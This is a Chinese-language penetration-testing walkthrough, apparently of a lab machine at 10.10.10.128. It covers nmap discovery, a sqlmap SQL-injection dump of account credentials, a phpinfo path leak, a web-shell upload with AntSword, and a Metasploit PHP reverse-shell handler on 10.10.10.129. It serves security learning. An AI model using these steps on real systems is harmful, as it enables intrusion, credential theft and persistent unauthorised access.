**前言**

通过信息收集，识别目标网站可能存在的安全漏洞，并对其进行复现和利用，以获取外网服务器的权限。进而可以进行提权、留后门等操作。

### 信息收集

1. **网络扫描与主机发现**
   - 使用 `Nmap -sP 10.10.10.0/24` 命令对指定子网（10.10.10.0/24）内的所有主机进行存活探测。
   - 执行 `nmap -sT -O 10.10.10.128` 对特定IP地址执行TCP SYN扫描并尝试识别操作系统类型。

2. **Web应用相关信息搜集**
   - 利用工具如“椰树”或类似软件来查找网站的目录结构及潜在开放路径。
   - 应用AWVS (Acunetix Web Vulnerability Scanner) 进行全面的安全性评估，包括但不限于SQL注入点、XSS跨站脚本攻击向量等。

### 漏洞利用

- 发现某页面存在SQL注入漏洞后，使用`sqlmap`工具导出数据库内容：
  ```bash
  sqlmap -r /root/2.txt --dump -D aiweb1
  ```
  获取到以下账户凭据：
  > 用户名：t00r 密码：FakeUserPassw0rd  
  > 用户名：aiweb1pwn 密码：MyEvilPass_f908sdaf9_sadfasf0sa  
  > 用户名：u3er 密码：N0tThis0neAls0

- 使用`dirb http://10.10.10.128`进一步探索目标站点的文件系统布局。
- 在枚举过程中定位到了一个PHP信息泄露页面(`phpinfo()`),从中得知了服务器文档根目录位置：`/home/www/html/web1x443290o2sdf92213`。
- 探索上传功能是否存在安全缺陷，最终成功上传恶意代码并通过`Sqlmap`工具触发命令执行。

### 提升权限与持久化访问

- 通过中国蚁剑远程管理工具连接至已攻陷的目标机器，检查是否存在敏感配置文件泄漏现象。
- 尝试两种方法实现更高权限控制：
  1. 直接在蚁剑内添加新的管理员账号；
  2. 采用Kali Linux作为攻击平台编写PHP反弹shell脚本，设置监听端口等待连接建立。

    ```bash
    use exploit/multi/handler
    set payload php/meterpreter/reverse_tcp
    set lhost 10.10.10.129
    set lport 8080
    run
    ```

- 若直接切换用户失败，则可借助Python创建伪终端环境以获得交互式Shell会话。

### 总结

渗透测试过程中应优先考虑获取Web Shell作为突破口。若无法直接取得，则需寻找其他途径如上传含有恶意代码的文件或者利用已知漏洞间接达成目的。掌握多种技术手段对于深入挖掘目标系统的弱点至关重要。